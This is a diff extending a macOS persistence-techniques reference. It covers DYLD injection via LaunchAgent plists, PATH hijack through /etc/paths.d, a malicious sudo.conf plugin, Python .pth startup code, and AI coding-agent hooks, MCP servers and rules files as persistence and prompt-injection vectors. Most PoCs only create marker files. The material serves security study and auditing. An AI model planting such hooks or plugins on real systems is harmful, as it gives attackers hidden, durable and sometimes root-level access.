+Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>
+
+- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle)
+  - Modern macOS requires a **manual user approval** in System Settings → *Device Management* (silent `profiles install` is gone outside MDM)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+
+#### Location
+
+- Installed profiles live under **`/Library/Managed Preferences/`** and **`/var/db/ConfigurationProfiles/`**; a profile is an XML plist with a `PayloadContent` array.
+
+#### Description & Exploitation
+
+A `.mobileconfig` is not a direct code-execution primitive, but it can persist configuration such as a **trusted root CA** (`com.apple.security.root`), a **global or PAC proxy** (`com.apple.proxy.*`), **managed preferences** (`com.apple.ManagedClient.preferences`), or restrictions. On macOS 10.15 and later, Apple's [`PayloadRemovalDisallowed` definition](https://developer.apple.com/documentation/devicemanagement/toplevel) says setting it to `true` on a **manually installed** profile without a removal-password payload requires **administrator authentication** to remove it; it does not make that profile absolutely unremovable. MDM-installed profiles have separate management and removal rules.<sup>[[44]](#references)</sup>
+
+> [!WARNING]
+> A plain configuration profile has **no payload type that drops an arbitrary `LaunchDaemon`/`LaunchAgent`**. Installing a daemon that way requires full **MDM enrollment** plus a management agent/script — do not treat `.mobileconfig` as a launchd delivery mechanism.
+
+```bash
+# Inspect installed profiles (user context)
+profiles list            # per-user
+sudo profiles show       # system (root)
+```
+
+### DYLD_INSERT_LIBRARIES Persistence
+
+- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle)
+  - dyld **strips** `DYLD_*` for SIP/platform binaries, hardened-runtime apps and setuid targets, so it only injects into unprotected processes and does **not** bypass SIP/the hardened runtime
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+
+#### Location
+
+- Reliable form: the **`EnvironmentVariables`** dict inside a malicious `LaunchAgent`/`LaunchDaemon` plist (runs at login/boot)
+- Dead/historical (report only): **`~/.MacOSX/environment.plist`** (removed in 10.8) and **`/etc/launchd.conf`** (removed in 10.10)
+
+#### Description & Exploitation
+
+If an attacker can get `DYLD_INSERT_LIBRARIES` into a victim process' environment, dyld loads the attacker dylib (its constructor runs) into that process. The persistent variant embeds the variable in a LaunchAgent so every launch of the job re-injects. Note that `launchctl setenv DYLD_*` is filtered on modern macOS, so embed it in the plist instead.<sup>[[45]](#references)</sup>
+
+```xml
+<key>EnvironmentVariables</key>
+<dict>
+    <key>DYLD_INSERT_LIBRARIES</key>
+    <string>/tmp/evil.dylib</string>
+</dict>
+```
+
+For the full mechanics of dylib injection/hijacking see:
+
+{{#ref}}
+macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
+{{#endref}}
+
+### AI Coding Agent CLIs (hooks, MCP servers, rules files)
+
+Writeups: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>
+
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+  - Requires the developer to use the relevant agent. Startup commands run with that user's privileges when the agent accepts their configuration; workspace trust and MCP approval vary by product and session mode.
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (runs as the user; inherits whatever the terminal/agent already has)
+
+#### Location
+
+The explicit hook and MCP configuration files can cause **shell commands or child processes to run when the developer uses the tool** — either from a per-user global file (persistence) or from a file committed in a repo (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, and editor rules are **instructions to an agent**, not guaranteed shell execution on read; their effect depends on the agent's behavior and tool permissions. Check each product's current trust and approval rules.
+
+- **Claude Code**
+  - `~/.claude/settings.json`, project `.claude/settings.json`, `.claude/settings.local.json`, and the root-only **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM/managed settings **cannot be overridden** by the user → strong persistence)
+  - `hooks` object — events `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — each runs a shell `command`
+  - `statusLine.command` — a shell command executed to render the status line (every session)
+  - MCP servers in `~/.claude.json` / project `.mcp.json` — `command`+`args` launched as child processes
+  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instructions that can attempt prompt injection, subject to agent behavior and tool permissions
+- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` launched as children); `AGENTS.md` project instructions
+- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
+- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … run commands); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`
+
+#### Description & Exploitation
+
+If an actor can modify the account's user-global settings, its hook or MCP commands can run on future sessions under that account. A repository-controlled config is a separate case: [current Claude Code security docs](https://code.claude.com/docs/en/security) describe an interactive workspace trust dialog and a separate approval prompt for project `.mcp.json` servers. [Its permission matrix](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) says hooks can run after a parent folder was trusted, and `claude -p`/SDK sessions do not show the interactive trust prompt; project MCP servers connect without an approval prompt in those noninteractive modes. The pre-trust project hook bypass reported as CVE-2025-59536 was [fixed in 2025](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); do not treat it as a current default behavior. Delivery vectors can include a compromised repository or a malicious installer. Rules-file prompt injection is less deterministic than an explicit hook and still depends on tool approvals.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>
+
+Example user-global Claude Code settings; place this only in a disposable account when testing:
+
+```json
+{
+  "hooks": {
+    "SessionStart": [
+      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
+    ]
+  },
+  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
+}
+```
+
+Example user-global Codex MCP configuration:
+
+```toml
+[mcp_servers.evil]
+command = "/bin/sh"
+args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
+```
+
+Example Cursor hook configuration; check its installed version's schema before using it:
+
+```json
+{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
+```
+
+```bash
+# Defensive audit: which agent configs can auto-run commands?
+ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
+       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
+       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
+python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
+```
+
+### Browser Extensions (Chromium: Chrome / Brave / Edge)
+
+Writeup: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [ExtensionInstallForcelist abuse on macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>
+
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+  - Requires a supported browser and an installed, enabled extension. External Extensions on macOS require a user confirmation; managed force-install requires an applicable enterprise policy.
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+
+> [!NOTE]
+> This is distinct from **native messaging hosts** (see the *Chrome native messaging hosts* section above). Here the persistence is the **auto-installed extension** itself.
+
+#### Location
+
+- **External Extensions JSON** (discovered on browser start, then subject to an enable prompt on macOS):
+  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (per-user) or `/Library/Application Support/Google/Chrome/External Extensions/` (all users)
+  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
+  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
+- **Enterprise-policy force-install** via managed preferences / a configuration profile:
+  - `com.google.Chrome` key `ExtensionInstallForcelist` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), read from `/Library/Managed Preferences/` or an installed `.mobileconfig`
+
+#### Description & Exploitation
+
+These are two different installation routes. Chrome's [external-install documentation](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) says **Windows and macOS users must confirm and enable** an extension offered through an *External Extensions* file; it does not execute merely because that JSON file was written. For all-user installation on macOS, Chrome also requires the external-extension file to be protected from unprivileged modification. A managed `ExtensionInstallForcelist` or `ExtensionSettings` policy can install and pin an extension without that user interaction; [Google's Mac policy guide](https://support.google.com/chrome/a/answer/7517624) describes the managed configuration and says force-installed extensions cannot be removed by the user. That is a policy deployment path, not a per-user `defaults write` shortcut.<sup>[[49]](#references)</sup>
+
+> [!WARNING]
+> On macOS, an *External Extensions* JSON manifest must point to a **Chrome Web Store** update URL, not a local CRX. Managed policy deployment has its own enterprise prerequisites and may permit a managed self-hosted update URL. For a local unpacked extension in a test profile, Chrome's developer-mode `--load-extension=/path` switch is a separate mechanism and does not make an External Extensions JSON file self-executing. Do not treat a write to `Secure Preferences` as equivalent to either documented registration route.
+
+```bash
+# In a disposable browser account, propose a Chrome Web Store extension for enablement
+ext_id='replace_with_32_character_web_store_id'
+external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
+mkdir -p "$external_dir"
+cat > "$external_dir/$ext_id.json" <<'JSON'
+{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
+JSON
+```
+
+Start Chrome in that disposable account and observe the enable prompt; the extension's own behavior is the execution PoC once the user accepts. After the test, remove the manifest and disable/uninstall the extension in that profile. This path was **not** exercised in the active Chrome profile on the research Mac. The managed-policy route was likewise not deployed there.
+
+Force-install and External Extensions reference **Chrome Web Store** extension IDs; for the lower-level trick of silently injecting a local extension by editing the profile's HMAC-signed `Secure Preferences`, and other Chromium-process abuse, see:
+
+{{#ref}}
+macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
+{{#endref}}
+
+### URL Scheme & File-Type Handlers (LaunchServices)
+
+Writeup: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>
+
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+  - The trigger is the victim clicking a link (e.g. in Chrome/Brave/Safari) or opening a file of the registered type
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+
+#### Location
+
+- An app bundle's `Info.plist` declaring **`CFBundleURLTypes`/`CFBundleURLSchemes`** (custom URL scheme) or **`CFBundleDocumentTypes`** (file extension/UTI)
+- Per-user effective defaults may appear in **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (`LSHandlers` array). Apple's supported API for choosing a URL-scheme default is `LSSetDefaultHandlerForURLScheme`; writing that plist directly is not a documented registration or cache-update method.
+
+#### Description & Exploitation
+
+Launch Services obtains URL-scheme and document claims from a registered app's `Info.plist`. [Apple's registration guide](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) says registration can happen when Finder discovers the app, at boot or login, or through an explicit registration API; merely writing an app somewhere is not a guaranteed immediate trigger. After registration, opening a matching URL or document can launch the selected handler app, subject to the user's default-handler choice and normal macOS launch checks. The supported `LSSetDefaultHandlerForURLScheme` API changes a user-preferred URL handler; it does not make a newly dropped app automatically execute.<sup>[[52]](#references)</sup>
+
+```bash
+# Inspect known handlers without registering an app or changing defaults
+/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
+```
+
+No app was registered and no handler preference was changed on the macOS 26.5.2 research Mac. To test an actual handler, use a disposable user account, register a marker-only app with a unique scheme, invoke its URL, then remove the app and its registration.
+
+For enumerating/abusing file-extension and URL-scheme handlers in depth, see:
+
+{{#ref}}
+macos-security-and-privilege-escalation/macos-file-extension-apps.md
+{{#endref}}
+
+### Python startup files (`.pth` / `usercustomize` / `sitecustomize`)
+
+Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>
+
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+  - Runs when the relevant Python interpreter starts with that site directory enabled; the trigger is not universal across virtual environments, Python builds, or startup flags
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+  - Runs with the privileges/TCC of whatever process launched the interpreter
+
+#### Location
+
+- **`$(python3 -m site --user-site)/*.pth`** (macOS framework builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
+  - No root required (user-writable)
+  - **Trigger**: startup of that Python build with its user site enabled; the `site` module processes `.pth` files in active site directories
+- **`<user-site>/usercustomize.py`**
+  - No root required
+  - **Trigger**: startup with the user site enabled (auto-imported by `site`)
+- **`<prefix>/site-packages/sitecustomize.py`** (e.g. `/opt/homebrew/lib/python3.13/site-packages/`, or system paths)
+  - Root/admin may be required depending on the interpreter location
+  - **Trigger**: startup of an interpreter that includes that site directory
+
+#### Description & Exploitation
+
+At startup, Python normally imports `site` and scans its active `site-packages` directories for `.pth` files. Besides adding paths, a `.pth` line beginning with `import ` executes Python code even if the named module is never otherwise used. Python also tries to import `sitecustomize` and, **when the user site is enabled**, `usercustomize`.<sup>[[56]](#references)</sup> The trigger is a later start of an interpreter that sees the modified directory. `-S` disables `site` processing; `-s`, `-I`, or `PYTHONNOUSERSITE` disable the **user-site** variants. `-I` does not generally disable a global `sitecustomize`. Virtual environments may also exclude the user site. Check `python3 -m site` for the specific interpreter.
+
+The following PoC was run on macOS 26.5.2. `PYTHONUSERBASE` moves the user site into a temporary directory for this test; no real user site is modified:
+
+```python
+import os, pathlib, subprocess, tempfile
+
+with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
+    env = os.environ.copy()
+    env['PYTHONUSERBASE'] = root
+    env.pop('PYTHONNOUSERSITE', None)
+    user_site = pathlib.Path(subprocess.check_output(
+        ['python3', '-m', 'site', '--user-site'], env=env, text=True
+    ).strip())
+    user_site.mkdir(parents=True)
+    pth_marker = pathlib.Path(root) / 'pth.marker'
+    user_marker = pathlib.Path(root) / 'user.marker'
+    (user_site / 'ht_probe.pth').write_text(
+        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
+    )
+    (user_site / 'usercustomize.py').write_text(
+        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
+    )
+    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
+    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
+```
+
+Both markers appeared. Repeating with `-s`, `-I`, or `-S` prevented both **user-site** markers in this test. `sitecustomize` in a global site directory was not tested.
+
 ## Root Sandbox Bypass
 
 > [!TIP]
 > Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** being **root** and/or requiring other **weird conditions.**
 
 ### Periodic
+
+> [!CAUTION]
+> **Historical mechanism:** On the macOS 26.5.2 test machine, `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic`, and the `com.apple.periodic-*` launch daemons are absent. Do not assume that creating `/etc/periodic` on a current system will schedule its contents. Check for both the command and an enabled scheduler on the target release before using the example below.
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>
 
@@ -1284,7 +1988,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.g
 
 #### Description & Exploitation
 
-The periodic scripts (**`/etc/periodic`**) are executed because of the **launch daemons** configured in `/System/Library/LaunchDaemons/com.apple.periodic*`. Note that scripts stored in `/etc/periodic/` are **executed** as the **owner of the file,** so this won't work for a potential privilege escalation.<sup>[[27]](#references)</sup>
+On older releases, the periodic scripts (**`/etc/periodic`**) were scheduled by **launch daemons** in `/System/Library/LaunchDaemons/com.apple.periodic*`. From macOS Big Sur 11.5, the periodic runner executed scripts in the periodic directories as the **owner of each file**, closing a former privilege-escalation path.<sup>[[27]](#references)</sup> The commands and directory listings below are historical output, not a macOS 26.5.2 test result.
 
 ```bash
 # Launch daemons that will execute the periodic scripts
@@ -1326,10 +2030,14 @@ weekly_local="/etc/weekly.local"			# Local scripts
 monthly_local="/etc/monthly.local"			# Local scripts
 ```
 
-If you manage to write any of the files `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local` it will be **executed sooner or later**.
+On older systems with `periodic` and its launch daemons installed and enabled, `/etc/daily.local`, `/etc/weekly.local`, and `/etc/monthly.local` were additional execution paths. A harmless read-only check is:
+
+```bash
+test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
+```
 
 > [!WARNING]
-> Note that the periodic script will be **executed as the owner of the script**. So if a regular user owns the script, it will be executed as that user (this might prevent privilege escalation attacks).
+> The owner-based rule applied to scripts directly in the periodic directories. The historical `999.local` wrapper used to source `/etc/daily.local`, `/etc/weekly.local`, or `/etc/monthly.local` without that same ownership check; when the scheduler ran as root, these local files ran as root. This distinction and the Big Sur 11.5 change are documented in the [original research](https://theevilbit.github.io/beyond/beyond_0019/). None of these paths should be assumed active when `periodic` is absent.
 
 ### PAM
 
@@ -1805,6 +2513,133 @@ RunService ()
 }
 ```
 
+### launchd Boot Tasks
+
+Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>
+
+- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (needs root)
+- Root required, plus either a **SIP bypass** or the **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access permission, depending on the path
+
+#### Location
+
+`launchd` embeds a plist in its **`__TEXT,__config`** section describing early "boot tasks". Several reference scripts/binaries that do **not** exist by default and can be created by an attacker:
+
+- SIP-bypass set: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
+- TCC/FDA set: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` pre-exists only on Sequoia+)
+
+#### Description & Exploitation
+
+Dump the embedded task table to see which files `launchd` will run and the supported keys (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):
+
+```bash
+otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
+  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
+```
+
+Creating one of the referenced files (e.g. `/etc/rc.server`) makes `launchd` execute it on the next (userspace) reboot. The most useful entries are gated by SIP or require TCC SysAdminFiles/Full Disk Access, so this is a root-level, reboot-triggered technique.<sup>[[40]](#references)</sup>
+
+### ~~NVRAM (`apple-trusted-trampoline`)~~
+
+Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>
+
+The `rc.trampoline` boot task runs a **platform (Apple-signed) binary** stored in the `apple-trusted-trampoline` NVRAM variable at boot, but **only when the `rc.trampoline=1` boot-arg is set and SIP is disabled** (with a ~390&nbsp;KB size limit and a blocking/return-fast constraint). Because it requires **root + SIP disabled + an Apple-signed payload**, it is essentially impractical for real-world persistence and is listed here only for completeness.<sup>[[41]](#references)</sup>
+
+### /etc/paths and /etc/paths.d (PATH hijack)
+
+- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (needs root to write)
+- Root required
+
+#### Location
+
+- **`/etc/paths`** and **`/etc/paths.d/*`** — read by **`path_helper`** (invoked from `/etc/zprofile`) to build the default `PATH` at login.
+
+#### Description & Exploitation
+
+Both are root-owned. Prepending an attacker-controlled directory (by editing `/etc/paths` or dropping a file in `/etc/paths.d/`) makes that directory appear early in every new login shell's `PATH`, so a malicious binary named like a common command (`ls`, `git`, …) **shadows** the real one and runs the next time the victim invokes it.
+
+```bash
+# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
+echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
+# -> /private/tmp/evil is prepended to PATH for new login shells
+```
+
+### storagekitd SIP Bypass (CVE-2024-44243)
+
+Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>
+
+- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (needs root)
+- Root required; result **bypasses SIP**. Affected macOS **15.0–15.1**, fixed in **15.2**
+
+#### Location
+
+- Drop a filesystem bundle in **`/Library/Filesystems/`**.
+
+#### Description & Exploitation
+
+`storagekitd` holds the entitlement **`com.apple.rootless.install.heritable`** and spawned the binaries of filesystem bundles with that SIP-bypassing capability **inherited**. By planting a malicious filesystem bundle, an attacker could run code with a SIP bypass to install **persistent kernel extensions** or write into SIP-protected `LaunchDaemon` directories — persistence that survives and defeats normal protections.<sup>[[46]](#references)</sup> Apple fixed it in macOS Sequoia 15.2.
+
+### sudo plugins (/etc/sudo.conf)
+
+Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>
+
+- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (needs root to write `/etc/sudo.conf`)
+- Root required to install; the plugin then runs inside **every `sudo` invocation** (setuid-root context)
+
+#### Location
+
+- **`/etc/sudo.conf`** — `Plugin` lines load shared objects from **`/usr/libexec/sudo/`** (or an absolute path). Absent by default (sudo uses a built-in policy), so creating it is a clean hook.
+
+#### Description & Exploitation
+
+`sudo` loads its policy/approval/audit plugins from `/etc/sudo.conf`. Because `sudo` is setuid-root, a malicious shared-object plugin executes with **root privileges every time any user runs `sudo`** — durable root persistence that also sees each sudo command.<sup>[[51]](#references)</sup> macOS ships sudo 1.9.x which supports the plugin API.
+
+```bash
+# As root: load a malicious audit/approval plugin on every sudo
+cat > /etc/sudo.conf <<'CONF'
+Plugin sudoers_policy sudoers.so
+Plugin ht_audit /usr/libexec/sudo/ht_audit.so
+CONF
+# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
+```
+
+### CoreMediaIO DAL Plug-Ins
+
+Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
+Minimal example: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>
+
+- **Legacy mechanism:** Deprecated since macOS 12.3. macOS 14.1 and later disable legacy video plug-ins by default. A user must restore legacy video support from Recovery before this path can work; a writable directory alone is insufficient. [Apple's current support guidance](https://support.apple.com/en-us/108387).
+- Root required to write the plug-in directory. Any code execution depends on a compatible client that still loads DAL plug-ins; this was not runtime-tested on macOS 26.
+
+#### Location
+
+- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
+  - Root required
+  - **Trigger:** A compatible camera client enumerates devices **after legacy support has been restored**. Client library validation can block a third-party plug-in.
+
+#### Description & Exploitation
+
+CoreMediaIO **DAL** (Device Abstraction Layer) plug-ins were loaded in-process by some camera applications. Apple's [camera-extension presentation](https://developer.apple.com/videos/play/wwdc2022/10022/) specifically says legacy DAL plug-ins did **not** work with FaceTime, QuickTime Player, or Photo Booth, and that many other clients enforce library validation. Modern [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) run out of process with a separate installation and approval model. The historical in-process technique does not imply a general Camera TCC bypass on current macOS.<sup>[[53]](#references)[[54]](#references)</sup>
+
+Read-only observation on macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` exists and is root-owned. Neither legacy support nor loading in any client was verified.
+
+### Directory Service Plugins
+
+Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>
+
+- **Legacy, conditional mechanism:** Requires root to install and a plug-in that is actually configured and loaded. DirectoryService's plug-in API is deprecated; consult the target Mac's Open Directory configuration before treating this as a boot trigger.
+
+#### Location
+
+- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
+  - Root required
+  - **Trigger:** `dspluginhelperd` loads an eligible configured plug-in when Open Directory needs it. [Apple's plug-in runtime guide](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) says plug-ins not configured for startup may load lazily when their node is opened.
+
+#### Description & Exploitation
+
+`dspluginhelperd` supports legacy DirectoryService plug-in bundles. A malicious plug-in can be a privileged execution path where the legacy plug-in is accepted and activated, distinct from PAM and Authorization Plugins. The directory's presence does not demonstrate that a newly written plug-in will run on the next boot. Apple's local `dspluginhelperd(8)` and `opendirectoryd(8)` manuals on macOS 26.5 still list the helper and this legacy path.<sup>[[53]](#references)</sup>
+
+Read-only observation on macOS 26: `/Library/DirectoryServices/PlugIns` and `/usr/libexec/dspluginhelperd` exist. No plug-in was installed, configured, or loaded during this test.
+
 ## Persistence techniques and tools
 
 - [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
@@ -1848,5 +2683,25 @@ RunService ()
 - [34] [Beyond the good ol' LaunchAgents - 23 - emond, The Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
 - [35] [Beyond the good ol' LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
 - [36] [Beyond the good ol' LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
+- [37] [Beyond the good ol' LaunchAgents - 10 - Application script files](https://theevilbit.github.io/beyond/beyond_0010/)
+- [38] [Beyond the good ol' LaunchAgents - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
+- [39] [Beyond the good ol' LaunchAgents - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
+- [40] [Beyond the good ol' LaunchAgents - 34 - launchd boot tasks](https://theevilbit.github.io/beyond/beyond_0034/)
+- [41] [Beyond the good ol' LaunchAgents - 35 - Persist through the NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
+- [42] [Using email for persistence on OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
+- [43] [Suspicious Apple Mail Rule Plist Modification (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
+- [44] [Malicious Profiles - One of the Most Serious Threats to Macs (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
+- [45] [The Art of Mac Malware Vol.1 - Ch.0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
+- [46] [Analyzing CVE-2024-44243, a macOS SIP bypass through kernel extensions (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
+- [47] [RCE and API Token Exfiltration Through Claude Code Project Files (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
+- [48] [New Vulnerability in GitHub Copilot and Cursor - Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
+- [49] [Chrome - Alternative installation methods (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
+- [50] [Remove ExtensionInstallForcelist in Chrome on Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
+- [51] [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
+- [52] [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
+- [53] [Two macOS persistence tricks abusing plugins (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
+- [54] [CoreMediaIO DAL minimal example (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
+- [55] [Sploitlight: Analyzing a Spotlight-based macOS TCC vulnerability (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
+- [56] [Python `site` module documentation (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
 
 {{#include ../banners/hacktricks-training.md}}
